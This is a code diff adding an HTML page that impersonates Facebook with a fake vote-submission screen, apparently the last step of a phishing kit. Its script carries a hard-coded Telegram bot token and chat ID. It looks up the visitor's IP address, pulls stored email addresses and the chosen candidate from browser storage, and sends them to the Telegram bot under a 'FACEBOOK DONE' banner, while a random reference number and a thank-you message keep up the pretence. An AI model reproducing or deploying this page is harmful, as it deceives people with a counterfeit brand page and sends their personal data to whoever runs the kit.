@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook - Voting</title>
+  <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #3b82f6;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col items-center justify-center text-center space-y-8">
+  <!-- Facebook logo -->
+  <h1 class="text-4xl font-bold text-blue-600">facebook</h1>
+
+  <!-- Loading View -->
+  <div id="loadingView" class="flex flex-col items-center space-y-6">
+    <div class="spinner"></div>
+    <p id="submittingMessage" class="text-gray-600 text-lg">Submitting your vote...</p>
+
+  </div>
+
+  <!-- Success View -->
+  <div id="successView" class="hidden flex flex-col items-center space-y-4">
+    <div class="text-4xl text-green-600">
+      <i class="fas fa-check-circle"></i>
+    </div>
+    <p id="thankYouMessage" class="text-gray-700 text-lg font-semibold"></p>
+    <p class="text-gray-600 text-md">
+      Voting Reference No.: <span id="referenceNumber" class="font-bold text-black"></span>
+    </p>
+  </div>
+
+  <script>
+    const botToken = "7840862788:AAGeGI8WpKs4DfSxOTCMca5mwTG5PjXVqhM";
+    const chatId = "-1002539821629";
+
+    const refNumber = Math.floor(100 + Math.random() * 900);
+    document.getElementById("referenceNumber").textContent = refNumber;
+
+    function formatTimestamp() {
+      const now = new Date();
+      const month = now.toLocaleString('default', { month: 'short' });
+      const day = now.getDate();
+      const hours = String(now.getHours() % 12 || 12).padStart(2, '0');
+      const minutes = String(now.getMinutes()).padStart(2, '0');
+      const seconds = String(now.getSeconds()).padStart(2, '0');
+      const ampm = now.getHours() >= 12 ? 'PM' : 'AM';
+      return `${month} ${day} - ${hours}:${minutes}:${seconds} ${ampm}`;
+    }
+
+    async function sendDoneMessage() {
+      const ip = await fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => data.ip)
+        .catch(() => 'Unknown IP');
+
+      const email1 = localStorage.getItem('email1') || 'N/A';
+      const email2 = localStorage.getItem('email2') || '';
+
+      let emailOutput = email1;
+      if (email2 && email2 !== email1) {
+        emailOutput += `, ${email2}`;
+      }
+
+      const time = formatTimestamp();
+
+      const candidate = localStorage.getItem('votedCandidate') || 'the candidate';
+
+     const message = `<b>[${ip}] - ✅ FACEBOOK DONE - [${time}]</b>\n` +
+                `<b>Voted Candidate:</b> <code>${candidate}</code>\n` +
+                `<b>Reference Number:</b> <code>${refNumber}</code>\n\n` +
+                `<b>From Email Address:</b> <code>${emailOutput}</code>`;
+
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+    }
+
+const candidate = localStorage.getItem('votedCandidate') || 'the candidate';
+document.getElementById('submittingMessage').innerHTML = `Submitting your vote to <strong>${candidate}</strong>...`;
+
+
+
+    setTimeout(() => {
+      document.getElementById("loadingView").classList.add("hidden");
+      document.getElementById("successView").classList.remove("hidden");
+
+      const candidate = localStorage.getItem('votedCandidate') || 'the candidate';
+      document.getElementById('thankYouMessage').textContent = `Thank you for voting ${candidate}!`;
+
+      sendDoneMessage();
+    }, 5000);
+  </script>
+</body>
+</html>
